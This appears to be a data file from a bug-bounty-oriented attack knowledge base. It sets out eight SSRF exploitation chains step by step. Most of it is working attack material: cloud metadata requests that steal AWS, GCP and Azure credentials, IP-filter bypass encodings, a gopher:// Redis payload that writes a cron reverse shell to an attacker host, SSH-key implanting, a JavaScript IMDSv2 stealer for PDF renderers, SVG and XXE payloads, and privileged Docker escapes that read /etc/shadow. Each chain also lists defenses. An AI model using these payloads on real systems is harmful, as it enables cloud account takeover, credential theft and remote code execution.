chains.title: SSRF → AWS metadata: stealing IAM credentials and dumping S3
chains.impact: Temporary IAM credentials for the instance role (AccessKeyId/SecretAccessKey/Token), reading every S3 bucket, RDS snapshot and secret the role can reach, and account-wide pivoting via STS. Capital One leaked 100M+ records; reports like this pay out on bug bounty programs.
chains.why: A single unauthenticated GET (or a PUT+GET combo for IMDSv2) turns a harmless image/URL proxy into the keys to the AWS account.
chains.precondition: A server-side fetcher (image proxy, WAF/reverse proxy, URL parameter) on EC2/ECS with an attached role; IMDSv1 is enabled OR the SSRF lets you control the method and headers (which also reaches IMDSv2).
chains.realWorld: Capital One breach 2019 (WAF SSRF → IMDSv1 → S3, 100M+ records); Yassine Aboukir 'Exploitation of an SSRF vulnerability against EC2 IMDSv2'.
chains.defense: Enforce IMDSv2 with hop-limit 1, least-privilege instance roles, block egress to 169.254.169.254 at the application level.

steps.title: Confirm the SSRF reaches link-local
steps.detail: GET http://169.254.169.254/latest/meta-data/  (expect ami-id/hostname and low latency)

steps.title: Bypass naive IP filters
steps.detail: http://[::ffff:169.254.169.254]/ , decimal http://2852039166/ , octal http://0251.0376.0251.0376/ , alias http://instance-data/latest/meta-data/

steps.title: Grab credentials via IMDSv1
steps.detail: GET /latest/meta-data/iam/security-credentials/  then  GET /latest/meta-data/iam/security-credentials/<ROLE>

steps.title: Defeat IMDSv2 via a PUT token
steps.detail: PUT /latest/api/token  with X-aws-ec2-metadata-token-ttl-seconds: 21600 , then GET the credentials with X-aws-ec2-metadata-token: <token>

steps.title: Load and verify the credentials
steps.detail: export AWS_ACCESS_KEY_ID=... AWS_SECRET_ACCESS_KEY=... AWS_SESSION_TOKEN=... ; aws sts get-caller-identity

steps.title: Monetize the role
steps.detail: aws s3 ls ; aws s3 sync s3://<bucket> . ; aws secretsmanager list-secrets ; aws rds describe-db-snapshots

steps.title: Same trigger on other clouds
steps.detail: Alibaba http://100.100.100.200/latest/meta-data/ ; DigitalOcean http://169.254.169.254/metadata/v1/user-data (often with secrets)

chains.title: Gopher → Redis: blind SSRF writes itself a cron reverse shell
chains.impact: Unauthenticated RCE as the redis/web user on an internal host, usually followed by stealing the same host's IMDS credentials. 'Internal service → RCE' chains pay out consistently.
chains.why: gopher:// turns a URL fetcher into a raw TCP socket, so a fully blind SSRF can speak the Redis RESP protocol and write a line into crontab.
chains.precondition: The SSRF supports gopher:// (or dict://); an internal Redis on 6379 with no auth / protected-mode disabled and a writable cron, SSH or webroot path.
chains.realWorld: Gopherus (tarunkant); Assetnote 'A Glossary of Blind SSRF Chains'.
chains.defense: requirepass + protected-mode, bind Redis to loopback only, strip the gopher:// and dict:// schemes in the fetcher allowlist.

steps.title: Fingerprint the service
steps.detail: dict://127.0.0.1:6379/INFO  or  gopher://127.0.0.1:6379/_PING  (expect +PONG)

steps.title: Generate the gopher payload
steps.q: gopher:// SSRF payload generator (Redis RCE / SMTP)
steps.detail: Gopherus --exploit redis  (cronjob | sshkey | php-webshell)

steps.title: Write the cron reverse shell
steps.detail: gopher://127.0.0.1:6379/_ + URL-encoded RESP: CONFIG SET dir /var/spool/cron/ ; CONFIG SET dbfilename root ; SET x "\n*/1 * * * * bash -i >& /dev/tcp/<ATK>/4444 0>&1\n" ; SAVE

steps.title: Alternative: drop an SSH key
steps.detail: CONFIG SET dir /root/.ssh/ ; CONFIG SET dbfilename authorized_keys ; SET x "<attacker-pubkey>" ; SAVE

steps.title: Alternative: load a malicious module
steps.detail: MODULE LOAD /tmp/exp.so  (if you can upload a file; also works against protected-mode-aware Redis)

steps.title: Catch the shell
steps.detail: nc -lvnp 4444

steps.title: Same trick on Memcached
steps.detail: gopher://127.0.0.1:11211/_ with set/stats to read or poison the cache

chains.title: DNS rebinding TOCTOU: walk past the allowlist straight into IMDS
chains.impact: Bypasses 'resolve-then-validate' SSRF filters, reaches 169.254.169.254 and steals IAM credentials even when the application explicitly blocks the metadata IP.
chains.why: At validation time the hostname points to a harmless public IP, and a millisecond later on the request it already resolves to 169.254.169.254: one URL, two different answers.
chains.precondition: The fetcher validates the resolved IP, then re-resolves on the actual request (classic TOCTOU); the attacker controls the authoritative DNS for their own domain.
chains.realWorld: Singularity of Origin (NCC Group); recent CVEs in Craft CMS (CVE-2026-27127), FastGPT, Postiz, Budibase repeat this TOCTOU pattern.
chains.defense: Resolve once and connect to exactly that pinned IP, reject link-local/private addresses after resolution, disable HTTP redirects.

steps.title: Stand up the rebinder
steps.detail: Singularity of Origin (NCC Group), or <hexPubIP>.<hexMetaIP>.rbndr.us (hex-encoded IPs, e.g. 7f000001.a9fea9fe; TTL 0)

steps.title: Pass the IP check
steps.detail: submit http://attacker.rebind.tld/latest/meta-data/iam/security-credentials/  (first A record = harmless public IP)

steps.title: Flip the DNS record
steps.detail: the authoritative DNS now answers 169.254.169.254 before the second resolution

steps.title: Land on metadata
steps.detail: the fetcher connects to 169.254.169.254; grab the role + IAM creds as in the SSRF → AWS metadata chain

steps.title: Multi-answer DNS variant
steps.detail: return both 1.2.3.4 and 169.254.169.254 in a single A record so the client picks the link-local one

chains.title: HTML-to-PDF renderer prints your AWS keys on page one
chains.impact: Blind/semi-blind SSRF where the metadata response is rendered straight into the generated PDF; local file read and IMDS credentials. One public case paid out.
chains.why: The PDF engine on headless Chrome executes attacker JavaScript, so it runs the PUT+token combo for IMDSv2 itself and draws the credentials right into the document.
chains.precondition: The application renders controllable HTML or a URL into a PDF (invoices, reports, resumes) via wkhtmltopdf / Puppeteer / headless Chrome.
chains.realWorld: Sadeghipour & Brocious, DEF CON 27 'Owning the Clout through SSRF and PDF Generators'; 'From $0 to $14,000: blind SSRF in a PDF generator'.
chains.defense: Render with --disable-local-file-access and JS disabled, sandbox the renderer with no IAM role and deny egress to link-local.

steps.title: Identify the rendering engine
steps.detail: read the Producer field in the PDF: Skia/PDF = headless Chromium, "wkhtmltopdf" = Qt WebKit

steps.title: Local file read (wkhtmltopdf)
steps.detail: <iframe src="file:///etc/passwd" width=1000 height=1000>
steps.success: contents of /etc/passwd in the finished PDF

steps.title: Hit metadata directly
steps.detail: <iframe src="http://169.254.169.254/latest/meta-data/iam/security-credentials/">

steps.title: IMDSv2 via JS in headless Chrome
steps.detail: <script>fetch('http://169.254.169.254/latest/api/token',{method:'PUT',headers:{'X-aws-ec2-metadata-token-ttl-seconds':'60'}}).then(r=>r.text()).then(t=>fetch('http://169.254.169.254/latest/meta-data/iam/security-credentials/<ROLE>',{headers:{'X-aws-ec2-metadata-token':t}})).then(r=>r.text()).then(d=>document.body.innerText=d)</script>

steps.title: Read the loot
steps.detail: open the resulting PDF; the file contents / credentials are printed on the page

steps.title: Pivot with the credentials
steps.detail: aws sts get-caller-identity ; aws s3 sync s3://<bucket> .

chains.title: Poisoned avatar: SSRF via SVG <image> in the preview pipeline
chains.impact: SSRF through an uploaded image that the server-side rasterizer fetches itself, pulling IMDS credentials or internal pages into the pixels of the finished preview.
chains.why: The attack surface is a harmless avatar upload, and the exfiltration channel is the rendered preview itself.
chains.precondition: The server rasterizes an uploaded SVG or processes images through ImageMagick/librsvg/headless browser without disabling external references.
chains.realWorld: ImageTragick (CVE-2016-3714) and many bounties for SSRF via SVG avatars.
chains.defense: Disable the url/https/msl coders in ImageMagick's policy.xml, strip external references from the SVG, rasterize with networking disabled.

steps.title: SVG referencing a remote image
steps.detail: <svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><image xlink:href="http://169.254.169.254/latest/meta-data/iam/security-credentials/" height="500" width="500"/></svg>

steps.title: url/MSL coder in ImageMagick
steps.detail: upload exploit.mvg/.svg: image over 0,0 0,0 'url:http://169.254.169.254/latest/meta-data/' (ImageTragick family)

steps.title: When the target needs a header
steps.detail: image fetchers cannot add Metadata-Flavor; use the header-free legacy GCP endpoint (see the GCP chain)

steps.title: Extract the response from the image
steps.detail: download the generated thumbnail; OCR or inspect the embedded text containing the metadata body

steps.title: Bonus XXE on XML parsers
steps.detail: <!DOCTYPE x [<!ENTITY e SYSTEM "http://169.254.169.254/latest/meta-data/">]>

chains.title: kube-env theft: SSRF to GCP metadata → kubelet certificates → root on every pod
chains.impact: Hijack the node service account's OAuth token AND the kubelet credentials from kube-env, gaining kubelet/cluster takeover and root across the whole GKE fleet. Shopify paid out.
chains.why: A single SSRF reads kube-env (which holds the kubelet's private TLS key) and bootstraps a fully privileged node identity across the entire cluster.
chains.precondition: A workload on GCE/GKE with default metadata access; metadata concealment / Workload Identity are not enabled.
chains.realWorld: Shopify HackerOne #341876 'SSRF in Exchange leads to ROOT access in all instances' ($25k).
chains.defense: Enable GKE Workload Identity + metadata concealment, restrict access to the kube-env attribute.

steps.title: Grab the service account token
steps.detail: GET http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token  with header Metadata-Flavor: Google

steps.title: Header-free bypass
steps.detail: if headers cannot be set: http://metadata.google.internal/computeMetadata/v1beta1/instance/service-accounts/default/token (legacy, no header)

steps.title: Steal the kubelet credentials
steps.detail: GET .../computeMetadata/v1/instance/attributes/kube-env  ->  extract CA_CERT, KUBELET_CERT, KUBELET_KEY

steps.title: Use the OAuth token
steps.detail: curl -H "Authorization: Bearer <token>" https://storage.googleapis.com/storage/v1/b?project=<id>

steps.title: Assemble the node kubeconfig
steps.detail: build a kubeconfig from the kube-env certificates -> talk to the API server, read all secrets, exec into pods

steps.title: Direct pivot via kubelet
steps.detail: internal https://<node>:10250/run/... (exec) or read-only http://<node>:10255/pods

chains.title: Azure multi-audience: one IMDS call, tokens for ARM + Key Vault + Graph
chains.impact: Managed identity tokens for management.azure.com (deploy/runCommand = RCE on the VM), vault.azure.net (secret dump) and graph.microsoft.com (directory), escalating to resource-group or subscription takeover.
chains.why: The same metadata endpoint mints tokens for different resource= audiences, so a single SSRF pivots from RCE to secrets to Entra ID.
chains.precondition: SSRF on an Azure VM or App Service with a system/user-assigned managed identity that holds at least some RBAC role.
chains.realWorld: CyberCX 'Azure SSRF Metadata'; Guardz 'Exploiting Azure Managed Identity Tokens from IMDS'.
chains.defense: Least-privilege managed identity (no blanket Contributor), restrict egress to IMDS, alert on runCommand and unusual token audiences.

steps.title: Mint an ARM token
steps.detail: GET http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/  with header Metadata: true

steps.title: Assess the blast radius
steps.detail: curl -H "Authorization: Bearer <arm>" https://management.azure.com/subscriptions?api-version=2020-01-01

steps.title: RCE via runCommand (Contributor)
steps.detail: POST .../virtualMachines/<vm>/runCommand?api-version=2023-03-01  body {"commandId":"RunShellScript","script":["id;curl ..."]}

steps.title: Switch to the Key Vault audience
steps.detail: re-request the token with resource=https://vault.azure.net  then GET https://<vault>.vault.azure.net/secrets?api-version=7.4

steps.title: Switch to the Graph audience
steps.detail: resource=https://graph.microsoft.com  ->  enumerate/escalate in Entra ID if the MI has directory roles

steps.title: App Service quirk
steps.detail: there the endpoint is $IDENTITY_ENDPOINT with header X-IDENTITY-HEADER: $IDENTITY_HEADER, not 169.254.169.254

chains.title: Dormant SSRF: a stored webhook URL that an internal worker sends to the Docker socket
chains.impact: Second-order SSRF reaches the Docker Engine API (tcp 2375) and launches a privileged container with / mounted, yielding root RCE on the host.
chains.why: The payload is stored (webhook target, link-unfurl/oEmbed, avatar URL) and detonates later from a trusted internal job runner whose Docker is exposed to the internal network.
chains.precondition: A stored URL that is later fetched by a server supporting gopher://; an internal Docker API on tcp 2375 with no authentication (or Consul/etcd as the backend).
chains.realWorld: kernelpicnic 'Pivoting from blind SSRF to RCE with HashiCorp Consul'; PT SWARM Docker API 2375 RCE; Cherny 'Well, That Escalated Quickly' (Black Hat US-17).
chains.defense: Never expose Docker on 2375 (TLS + socket permissions), bind Consul to loopback with -enable-local-script-checks=false, re-validate stored URLs at fetch time, drop gopher://.

steps.title: Plant the stored URL
steps.detail: point a webhook / oEmbed-unfurl / profile URL at your gopher payload; wait for the async worker (this also reaches internal admin panels)

steps.title: Confirm Docker is listening
steps.detail:
gopher://127.0.0.1:2375/_GET /version HTTP/1.1
Host:x

  ->  Docker version banner

steps.title: Create a privileged container
steps.detail: gopher POST /containers/create JSON {"Image":"alpine","Cmd":["/bin/sh","-c","..."],"HostConfig":{"Binds":["/:/host"],"Privileged":true}}

steps.title: Start it and write to the host
steps.detail: gopher POST /containers/<id>/start  then /exec  ->  drop an SSH key or reverse shell under /host

steps.title: Direct one-command equivalent
steps.detail: docker -H tcp://<host>:2375 run --rm --privileged -v /:/mnt alpine chroot /mnt sh -c 'id; cat /mnt/etc/shadow'

steps.title: Consul alternative
steps.detail: PUT /v1/agent/service/register with a script health check command (when script checks are enabled) for RCE
